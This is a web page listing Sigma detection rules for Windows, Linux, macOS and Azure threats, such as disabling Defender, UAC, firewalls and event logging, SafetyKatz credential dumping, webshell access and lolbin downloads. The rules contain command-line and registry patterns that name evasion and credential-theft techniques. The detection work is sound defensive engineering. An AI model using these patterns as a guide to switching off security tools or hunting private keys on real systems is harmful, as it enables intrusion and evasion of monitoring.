<li><a href="#">title:Detection of PowerShell Execution via Sqlps.exe id: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3 status: test description: This rule detects execution of a PowerShell code through the sqlps.exe utility, which is included in the standard set of utilities supplied with the MSSQL Server. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs. author: 'Agro (@agro_sev) oscd.community' references: - - - date: 2020/10/10 modified: 2022/02/25 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\sqlps.exe' selection_2: ParentImage|endswith: '\sqlps.exe' selection_3: OriginalFileName: '\sqlps.exe' filter: ParentImage|endswith: '\sqlagent.exe' condition: 1 of selection_* and not filter falsepositives: - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe spawned by sqlagent.exe is a legitimate action. level: medium tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Detection of SafetyKatz id: e074832a-eada-4fd7-94a1-10642b130e16 status: test description: Detects possible SafetyKatz Behaviour author: Markus Neis references: - date: 2018/07/24 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: '\Temp\debug.bin' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.001 
<li><a href="#">title:Device Registration or Join Without MFA id: 5afa454e-030c-4ab4-9253-a90aa7fcc581 description: Monitor and alert for device registration or join events where MFA was not performed. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: signinlogs detection: selection: ResourceDisplayName: 'Device Registration Service' conditionalAccessStatus: 'success' filter_mfa: AuthenticationRequirement: 'multiFactorAuthentication' condition: selection and not filter_mfa falsepositives: - Unknown level: medium status: experimental tags: - attack.valid_accounts - attack.t1078 
<li><a href="#">title:DevInit Lolbin Download id: 90d50722-0483-4065-8e35-57efaadd354d status: experimental description: Detects a certain command line flag combination used by devinit.exe lolbin to download arbitrary MSI packages on a Windows system references: - tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Florian Roth date: 2022/01/11 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' -t msi-install ' - ' -i http' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Devtoolslauncher.exe Executes Specified Binary id: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6 status: test description: The Devtoolslauncher.exe executes other binary author: Beyu Denis, oscd.community (rule), @_felamos (idea) references: - - date: 2019/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\devtoolslauncher.exe' CommandLine|contains: 'LaunchForDeploy' condition: selection falsepositives: - Legitimate use of devtoolslauncher.exe by legitimate user level: high tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:DEWMODE Webshell Access id: fdf96c90-42d5-4406-8a9c-14a2c9a016b5 status: experimental description: Detects access to DEWMODE webshell as described in FIREEYE report author: Florian Roth date: 2021/02/22 references: - tags: - attack.persistence - attack.t1505.003 logsource: category: webserver detection: selection1: c-uri|contains|all: - '?dwn=' - '&fn=' - '.html?' selection2: c-uri|contains|all: - '&dwn=' - '?fn=' - '.html?' condition: 1 of selection* fields: - client_ip - response falsepositives: - Unknown level: high 
<li><a href="#">title:DHCP Callout DLL Installation id: 9d3436ef-9476-4c43-acca-90ce06bdf33a status: test description: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required) author: Dimitrios Slamaris references: - - (v=ws.10).aspx - (v=vs.85).aspx date: 2017/05/15 modified: 2022/06/26 logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject|endswith: - '\Services\DHCPServer\Parameters\CalloutDlls' - '\Services\DHCPServer\Parameters\CalloutEnabled' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1574.002 - attack.t1112 
<li><a href="#">title:DHCP Server Error Failed Loading the CallOut DLL id: 75edd3fd-7146-48e5-9848-3013d7f0282c description: This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded status: experimental references: - - (v=ws.10).aspx - (v=vs.85).aspx date: 2017/05/15 modified: 2021/10/13 tags: - attack.defense_evasion - attack.t1574.002 author: 'Dimitrios Slamaris, @atc_project (fix)' logsource: product: windows service: system detection: selection: EventID: - 1031 - 1032 - 1034 Provider_Name: Microsoft-Windows-DHCP-Server condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:DHCP Server Loaded the CallOut DLL id: 13fc89a9-971e-4ca6-b9dc-aa53a445bf40 status: experimental description: This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded references: - - (v=ws.10).aspx - (v=vs.85).aspx date: 2017/05/15 modified: 2021/10/13 author: Dimitrios Slamaris tags: - attack.defense_evasion - attack.t1574.002 logsource: product: windows service: system detection: selection: EventID: 1033 Provider_Name: Microsoft-Windows-DHCP-Server condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:DInject PowerShell Cradle CommandLine Flags id: d78b5d61-187d-44b6-bf02-93486a80de5a status: test description: Detects the use of the Dinject PowerShell cradle based on the specific flags author: Florian Roth references: - date: 2021/12/07 modified: 2022/03/07 tags: - attack.defense_evasion - attack.t1055 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' /am51' - ' /password' filter_fps: - CommandLine|contains: ' /PASSWORDCHG' # net user - ParentImage: - 'C:\Program Files\CEETIS\CEETIS_IDE.exe' # CEETIS from WEETECH - 'C:\Program Files (x86)\CEETIS\CEETIS_IDE.exe' condition: selection and not 1 of filter_* falsepositives: - Unlikely level: critical 
<li><a href="#">title:Direct Autorun Keys Modification id: 24357373-078f-44ed-9ac4-6d334a668a11 status: test description: Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe. author: Victor Sergeev, Daniil Yugoslavskiy, oscd.community references: - date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\reg.exe' CommandLine|contains: 'add' # to avoid intersection with discovery tactic rules selection_2: CommandLine|contains: # need to improve this list, there are plenty of ASEP reg keys - '\software\Microsoft\Windows\CurrentVersion\Run' - '\software\Microsoft\Windows\CurrentVersion\RunOnce' - '\software\Microsoft\Windows\CurrentVersion\RunOnceEx' - '\software\Microsoft\Windows\CurrentVersion\RunServices' - '\software\Microsoft\Windows\CurrentVersion\RunServicesOnce' - '\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit' - '\software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell' - '\software\Microsoft\Windows NT\CurrentVersion\Windows' - '\software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' - '\system\CurrentControlSet\Control\SafeBoot\AlternateShell' condition: selection_1 and selection_2 fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reasons. - Legitimate administrator sets up autorun keys for legitimate reasons. level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Direct Syscall of NtOpenProcess id: 3f3f3506-1895-401b-9cc3-e86b16e630d0 description: Detects the usage of the direct syscall of NtOpenProcess which might be done from a CobaltStrike BOF. references: - status: experimental author: Christian Burkard, Tim Shelton date: 2021/07/28 modified: 2022/06/20 logsource: category: process_access product: windows detection: selection: CallTrace|startswith: 'UNKNOWN' falsepositive1: TargetImage: 'C:\Program Files\Cylance\Desktop\CylanceUI.exe' SourceImage: 'C:\Windows\Explorer.EXE' falsepositive2: TargetImage: 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' SourceImage: 'C:\Program Files (x86)\Microsoft\Temp\*\MicrosoftEdgeUpdate.exe' falsepositive3: TargetImage|endswith: 'vcredist_x64.exe' SourceImage|endswith: 'vcredist_x64.exe' falsepositive4: TargetImage: 'C:\Windows\system32\systeminfo.exe' SourceImage|endswith: 'setup64.exe' #vmware falsepositive5: TargetImage|endswith: 'AmazonSSMAgentSetup.exe' SourceImage|endswith: 'AmazonSSMAgentSetup.exe' falsepositive6: TargetImage|endswith: 'C:\Program Files\Mozilla Firefox\firefox.exe' SourceImage|endswith: 'C:\Program Files\Mozilla Firefox\firefox.exe' condition: selection and not 1 of falsepositive* falsepositives: - Unknown level: high tags: - attack.execution - attack.t1106 
<li><a href="#">title:DirectorySearcher Powershell Exploitation id: 1f6399cf-2c80-4924-ace1-6fcff3393480 status: experimental description: Enumerates Active Directory to determine computers that are joined to the domain date: 2022/02/12 references: - author: frack113 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'New-Object ' - 'System.DirectoryServices.DirectorySearcher' - '.PropertiesToLoad.Add' - '.findall()' - 'Properties.name' condition: selection falsepositives: - Unknown level: medium tags: - attack.discovery - attack.t1018 
<li><a href="#">title:Disable Administrative Share Creation at Startup id: c7dcacd0-cc59-4004-b0a4-1d6cdebe6f3e description: Administrative shares are hidden network shares created by Microsoftâ€™s Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system author: frack113 date: 2022/01/16 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|startswith: HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\ TargetObject|endswith: - AutoShareWks - AutoShareServer Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1070.005 
<li><a href="#">title:Disable Exploit Guard Network Protection on Windows Defender id: bf9e1387-b040-4393-9851-1598f8ecfae9 description: Detects disabling Windows Defender Exploit Guard Network Protection status: experimental date: 2021/08/04 modified: 2022/03/26 author: Austin Songer @austinsonger references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection\DisallowExploitProtectionOverride' Details: 'DWORD (00000001)' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disable Important Scheduled Task id: 9ac94dc8-9042-493c-ba45-3b5e7c86b980 status: experimental description: Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server. author: frack113 references: - date: 2021/12/26 logsource: category: process_creation product: windows detection: schtasks_exe: Image|endswith: \schtasks.exe CommandLine|contains|all: - /Change - /TN - /disable #split to add other schtasks_name: CommandLine|contains: '\Microsoft\Windows\SystemRestore\SR' condition: all of schtasks_* falsepositives: - Unknown level: high tags: - attack.impact - attack.t1489 
<li><a href="#">title:Disable Internal Tools or Feature in Registry id: e2482f8d-3443-4237-b906-cc145d87a076 status: experimental description: Detects registry modifications that change features of internal Windows tools (malware like Agent Tesla uses this technique) references: - - author: frack113, Nasreddine Bencherchali date: 2022/03/18 modified: 2022/06/03 logsource: category: registry_set product: windows detection: selection_set_1: EventType: SetValue TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\DisableRegistryTools' - 'SOFTWARE\Policies\Microsoft\Windows\System\DisableCMD' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\DisableTaskmgr' - 'SOFTWARE\Policies\Microsoft\Windows\Explorer\DisableNotificationCenter' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\StartMenuLogOff' Details: 'DWORD (0x00000001)' selection_set_0: EventType: SetValue TargetObject|endswith: - 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\shutdownwithoutlogon' - 'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications\ToastEnabled' - '\SYSTEM\CurrentControlSet\Control\Storage\Write Protection' - '\SYSTEM\CurrentControlSet\Control\StorageDevicePolicies\WriteProtect' Details: 'DWORD (0x00000000)' condition: 1 of selection_set_* falsepositives: - Legitimate admin script level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Disable Microsoft Defender Firewall via Registry id: 974515da-6cc5-4c95-ae65-f97f9150ec7f description: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage author: frack113 date: 2022/01/09 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue #HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\EnableFirewall #HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall #HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\EnableFirewall TargetObject|startswith: HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\ TargetObject|endswith: \EnableFirewall Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562.004 
<li><a href="#">title:Disable Microsoft Office Security Features id: 7c637634-c95d-4bbf-b26c-a82510874b34 description: Disable Microsoft Office Security Features by registry status: experimental date: 2021/06/08 modified: 2022/03/26 author: frack113 references: - - - logsource: product: windows category: registry_set definition: key must be add to the sysmon configuration to works # Sysmon # <TargetObject name="T1562,office" condition="end with">\VBAWarnings</TargetObject> # <TargetObject name="T1562,office" condition="end with">\DisableInternetFilesInPV</TargetObject> # <TargetObject name="T1562,office" condition="end with">\DisableUnsafeLocationsInPV</TargetObject> # <TargetObject name="T1562,office" condition="end with">\DisableAttachementsInPV</TargetObject> detection: selection: EventType: SetValue TargetObject|contains: '\SOFTWARE\Microsoft\Office\' TargetObject|endswith: - VBAWarnings - DisableInternetFilesInPV - DisableUnsafeLocationsInPV - DisableAttachementsInPV Details: 'DWORD (0x00000001)' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disable of ETW Trace id: 115fdba9-f017-42e6-84cf-d5573bf2ddf8 related: - id: a238b5d0-ce2d-4414-a676-7a531b3d13d6 type: derived status: experimental description: Detects usage of powershell cmdlets to disable or remove ETW trace sessions author: Nasreddine Bencherchali references: - date: 2022/06/28 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_pwsh_remove: #Autologger provider removal ScriptBlockText|contains: 'Remove-EtwTraceProvider ' selection_pwsh_set: #Provider â€œEnableâ€ property modification ScriptBlockText|contains|all: - 'Set-EtwTraceProvider ' - '0x11' condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070 - attack.t1562.006 - car.2016-04-002 
<li><a href="#">title:Disable of ETW Trace id: a238b5d0-ce2d-4414-a676-7a531b3d13d6 status: test description: Detects a command that clears or disables any ETW trace log which could indicate a logging evasion. author: '@neu5ron, Florian Roth, Jonhnathan Ribeiro, oscd.community' references: - - - date: 2019/03/22 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection_clear_1: CommandLine|contains|all: - 'cl' - '/Trace' selection_clear_2: CommandLine|contains|all: - 'clear-log' - '/Trace' selection_disable_1: CommandLine|contains|all: - 'sl' - '/e:false' selection_disable_2: CommandLine|contains|all: - 'set-log' - '/e:false' selection_disable_3: #ETW provider removal from a trace session CommandLine|contains|all: - 'logman' - 'update' - 'trace' - '--p' - '-ets' selection_pwsh_remove: #Autologger provider removal CommandLine|contains: 'Remove-EtwTraceProvider' selection_pwsh_set: #Provider â€œEnableâ€ property modification CommandLine|contains|all: - 'Set-EtwTraceProvider' - '0x11' condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070 - attack.t1562.006 - car.2016-04-002 
<li><a href="#">title:Disable or Delete Windows Eventlog id: cd1f961e-0b96-436b-b7c6-38da4583ec00 status: experimental description: Detects command that is used to disable or delete Windows eventlog via logman Windows utility references: - - tags: - attack.defense_evasion - attack.t1562.001 - attack.t1070.001 author: Florian Roth date: 2021/02/11 modified: 2021/12/02 logsource: category: process_creation product: windows detection: selection_tools: CommandLine|contains: 'logman ' selection_action: CommandLine|contains: - 'stop ' - 'delete ' selection_service: CommandLine|contains: EventLog-System condition: all of selection* falsepositives: - Legitimate deactivation by administrative staff - Installer tools that disable services, e.g. before log collection agent installation level: high 
<li><a href="#">title:Disable PUA Protection on Windows Defender id: 8ffc5407-52e3-478f-9596-0a7371eafe13 description: Detects disabling Windows Defender PUA protection status: experimental date: 2021/08/04 modified: 2022/07/04 author: Austin Songer @austinsonger references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\Policies\Microsoft\Windows Defender\PUAProtection' Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disable Security Events Logging Adding Reg Key MiniNt id: 919f2ef0-be2d-4a7a-b635-eb2b41fde044 status: test description: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events. author: Ilyas Ochkov, oscd.community references: - date: 2019/10/25 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: # Sysmon gives us HKLM\SYSTEM\CurrentControlSet\.. if ControlSetXX is the selected one - TargetObject: 'HKLM\SYSTEM\CurrentControlSet\Control\MiniNt' EventType: 'CreateKey' # we don't want deletekey # key rename - NewName: 'HKLM\SYSTEM\CurrentControlSet\Control\MiniNt' condition: selection fields: - EventID - Image - TargetObject - NewName falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 - attack.t1112 
<li><a href="#">title:Disable Security Tools id: ff39f1a6-84ac-476f-a1af-37fcdf53d7c0 status: test description: Detects disabling security tools author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: launchctl_unload: Image: '/bin/launchctl' CommandLine|contains: 'unload' security_plists: CommandLine|contains: - 'com.objective-see.lulu.plist' # Objective-See firewall management utility - 'com.objective-see.blockblock.plist' # Objective-See persistence locations watcher/blocker - 'com.google.santad.plist' # google santa - 'com.carbonblack.defense.daemon.plist' # carbon black - 'com.carbonblack.daemon.plist' # carbon black - 'at.obdev.littlesnitchd.plist' # Objective Development Software firewall management utility - 'com.tenablesecurity.nessusagent.plist' # Tenable Nessus - 'com.opendns.osx.RoamingClientConfigUpdater.plist' # OpenDNS Umbrella - 'com.crowdstrike.falcond.plist' # Crowdstrike Falcon - 'com.crowdstrike.userdaemon.plist' # Crowdstrike Falcon - 'osquery' # facebook osquery - 'filebeat' # elastic log file shipper - 'auditbeat' # elastic auditing agent/log shipper - 'packetbeat' # elastic network logger/shipper - 'td-agent' # fluentd log shipper disable_gatekeeper: Image: '/usr/sbin/spctl' CommandLine|contains: 'disable' condition: (launchctl_unload and security_plists) or disable_gatekeeper falsepositives: - Legitimate activities level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disable System Firewall id: 53059bc0-1472-438b-956a-7508a94a91f0 status: experimental description: Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network. author: 'Pawel Mazur' references: - - - date: 2022/01/22 logsource: product: linux service: auditd detection: selection: type: 'SERVICE_STOP' unit: - 'firewalld' - 'iptables' - 'ufw' condition: selection falsepositives: - Admin activity level: high tags: - attack.t1562.004 - attack.defense_evasion 
<li><a href="#">title:Disable Tamper Protection on Windows Defender id: 93d298a1-d28f-47f1-a468-d971e7796679 description: Detects disabling Windows Defender Tamper Protection status: experimental date: 2021/08/04 modified: 2022/04/21 author: Austin Songer @austinsonger references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\Microsoft\Windows Defender\Features\TamperProtection' Details: DWORD (0x00000000) filter_msmpeng_client: # only disabled temporarily during updates Image|startswith: 'C:\ProgramData\Microsoft\Windows Defender\Platform\' Image|endswith: '\MsMpEng.exe' filter_msmpeng_domain_controller: # only disabled temporarily during updates Image: 'C:\Program Files\Windows Defender\MsMpEng.exe' condition: selection and not 1 of filter_* falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disable UAC Using Registry id: 48437c39-9e5f-47fb-af95-3d663c3f2919 description: Disable User Account Conrol (UAC) by changing its registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0 author: frack113 date: 2022/01/05 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 
<li><a href="#">title:Disable Windows IIS HTTP Logging id: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e status: experimental description: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union) author: frack113 references: - date: 2022/01/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \appcmd.exe CommandLine|contains|all: - set - config - '/section:httplogging' - '/dontLog:true' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.002 
<li><a href="#">title:Disable Winevt Event Logging Via Registry id: 2f78da12-f7c7-430b-8b19-a28f269b77a3 description: Detects tempering with the "Enabled" registry key in order to disable windows logging of a windows event channel author: frack113, Nasreddine Bencherchali date: 2022/07/04 status: experimental references: - - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|startswith: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\ TargetObject|endswith: \Enabled Details: DWORD (0x00000000) filter: Image|endswith: '\Windows\system32\wevtutil.exe' #FP generated during installation of manifests via wevtutil condition: selection and not filter falsepositives: - Legitimate administrators disabling specific event log for troubleshooting level: high tags: - attack.defense_evasion - attack.t1562.002 
<li><a href="#">title:Disabled IE Security Features id: fb50eb7a-5ab1-43ae-bcc9-091818cb8424 status: test description: Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features author: Florian Roth references: - date: 2020/06/19 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - ' -name IEHarden ' - ' -value 0 ' selection2: CommandLine|contains|all: - ' -name DEPOff ' - ' -value 1 ' selection3: CommandLine|contains|all: - ' -name DisableFirstRunCustomize ' - ' -value 2 ' condition: 1 of selection* falsepositives: - Unknown, maybe some security software installer disables these features temporarily level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disabled MFA to Bypass Authentication Mechanisms id: 7ea78478-a4f9-42a6-9dcd-f861816122bf status: experimental description: Detection for when multi factor authentication has been disabled, which might indicate a malicious activity to bypass authentication mechanisms. author: '@ionsor' date: 2022/02/08 references: - - logsource: product: azure service: activitylogs detection: selection: eventSource: AzureActiveDirectory eventName: 'Disable Strong Authentication.' status: success condition: selection falsepositives: - Authorized modification by administrators level: medium tags: - attack.persistence - attack.t1556 
<li><a href="#">title:Disabled Users Failing To Authenticate From Source Using Kerberos id: 4b6fe998-b69c-46d8-901b-13677c9fb663 description: Detects failed logins with multiple disabled domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4768 Status: '0x12' filter_computer: TargetUserName|endswith: '$' timeframe: 24h condition: - selection and not filter_computer falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium 
<li><a href="#">title:Disabled Volume Snapshots id: dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a description: Detects commands that temporarily turn off Volume Snapshots references: - date: 2021/01/28 status: experimental author: Florian Roth tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'reg' - ' add ' - '\Services\VSS\Diag' - '/d Disabled' condition: selection falsepositives: - Legitimate administration level: high 
<li><a href="#">title:Disabled Windows Defender Eventlog id: fcddca7c-b9c0-4ddf-98da-e1e2d18b0157 description: Detects the disabling of the Windows Defender eventlog as seen in relation to Lockbit 3.0 infections status: experimental date: 2022/07/04 author: Florian Roth references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational\Enabled' Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Other Antivirus software installations could cause Windows to disable that eventlog (unknown) level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Disabling Security Tools id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36 related: - id: e3a8a052-111f-4606-9aee-f28ebeb76776 type: derived status: experimental description: Detects disabling security tools author: Ã–mer GÃ¼nal, Alejandro Ortuno, oscd.community date: 2020/06/17 modified: 2021/09/14 references: - tags: - attack.defense_evasion - attack.t1562.004 logsource: product: linux service: syslog detection: keywords: - '*stopping iptables*' - '*stopping ip6tables*' - '*stopping firewalld*' - '*stopping cbdaemon*' - '*stopping falcon-sensor*' condition: keywords falsepositives: - Legitimate administration activities level: medium 
<li><a href="#">title:Disabling Security Tools id: e3a8a052-111f-4606-9aee-f28ebeb76776 status: experimental description: Detects disabling security tools author: Ã–mer GÃ¼nal, Alejandro Ortuno, oscd.community date: 2020/06/17 modified: 2021/09/14 references: - tags: - attack.defense_evasion - attack.t1562.004 logsource: category: process_creation product: linux detection: selection_iptables_1: Image|endswith: '/service' CommandLine|contains|all: - 'iptables' - 'stop' selection_iptables_2: Image|endswith: '/service' CommandLine|contains|all: - 'ip6tables' - 'stop' selection_iptables_3: Image|endswith: '/chkconfig' CommandLine|contains|all: - 'iptables' - 'stop' selection_iptables_4: Image|endswith: '/chkconfig' CommandLine|contains|all: - 'ip6tables' - 'stop' selection_firewall_1: Image|endswith: '/systemctl' CommandLine|contains|all: - 'firewalld' - 'stop' selection_firewall_2: Image|endswith: '/systemctl' CommandLine|contains|all: - 'firewalld' - 'disable' selection_carbonblack_1: Image|endswith: '/service' CommandLine|contains|all: - 'cbdaemon' - 'stop' selection_carbonblack_2: Image|endswith: '/chkconfig' CommandLine|contains|all: - 'cbdaemon' - 'off' selection_carbonblack_3: Image|endswith: '/systemctl' CommandLine|contains|all: - 'cbdaemon' - 'stop' selection_carbonblack_4: Image|endswith: '/systemctl' CommandLine|contains|all: - 'cbdaemon' - 'disable' selection_selinux: Image|endswith: '/setenforce' CommandLine|contains: '0' selection_crowdstrike_1: Image|endswith: '/systemctl' CommandLine|contains|all: - 'stop' - 'falcon-sensor' selection_crowdstrike_2: Image|endswith: '/systemctl' CommandLine|contains|all: - 'disable' - 'falcon-sensor' condition: 1 of selection* falsepositives: - Legitimate administration activities level: medium 
<li><a href="#">title:Disabling Windows Event Auditing id: 69aeb277-f15f-4d2d-b32a-55e883609563 status: test description: 'Detects scenarios where system auditing (ie: windows event log auditing) is disabled. This may be used in a scenario where an entity would want to bypass local logging to evade detection when windows event logging is enabled and reviewed. Also, it is recommended to turn off "Local Group Policy Object Processing" via GPO, which will make sure that Active Directory GPOs take precedence over local/edited computer policies via something such as "gpedit.msc". Please note, that disabling "Local Group Policy Object Processing" may cause an issue in scenarios of one off specific GPO modifications -- however it is recommended to perform these modifications in Active Directory anyways.' author: '@neu5ron' references: - date: 2017/11/19 modified: 2021/11/27 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Computer Management > Audit Policy Configuration, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\Policy Change\Audit Authorization Policy Change' detection: selection: EventID: 4719 AuditPolicyChanges|contains: - '%%8448' # This is "Success removed" - '%%8450' # This is "Failure removed" condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.002 
<li><a href="#">title:Discover Private Keys id: 213d6a77-3d55-4ce8-ba74-fcfef741974e status: experimental author: frack113 date: 2021/07/20 description: Adversaries may search for private key certificate files on compromised systems for insecurely stored credential references: - tags: - attack.credential_access - attack.t1552.004 logsource: category: process_creation product: windows detection: selection_exe: CommandLine|contains: - 'dir ' - 'findstr ' selection_ext: CommandLine|contains: - '.key' - '.pgp' - '.gpg' - '.ppk' - '.p12' - '.pem' - '.pfx' - '.cer' - '.p7b' - '.asc' condition: selection_exe and selection_ext fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Discovery of a System Time id: b243b280-65fe-48df-ba07-6ddea7646427 status: test description: Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection_time: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains: 'time' selection_w32tm: Image|endswith: '\w32tm.exe' CommandLine|contains: 'tz' condition: 1 of selection_* falsepositives: - Legitimate use of the system utilities to discover system time for legitimate reason level: low tags: - attack.discovery - attack.t1124 
<li><a href="#">title:Dism Remove Online Package id: 43e32da2-fdd0-4156-90de-50dfd62636f9 status: experimental description: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images author: frack113 date: 2022/01/16 references: - logsource: category: process_creation product: windows detection: selection_dismhost: Image|endswith: '\DismHost.exe' ParentCommandLine|contains|all: - '/online' - '/Disable-Feature' - '/FeatureName:' - '/Remove' #/NoRestart #/quiet selection_dism: Image|endswith: '\Dism.exe' CommandLine|contains|all: - '/online' - '/Disable-Feature' - '/FeatureName:' - '/Remove' #/NoRestart #/quiet condition: 1 of selection_* falsepositives: - Legitimate script level: medium tags: - attack.defense_evasion - attack.t1562.001 
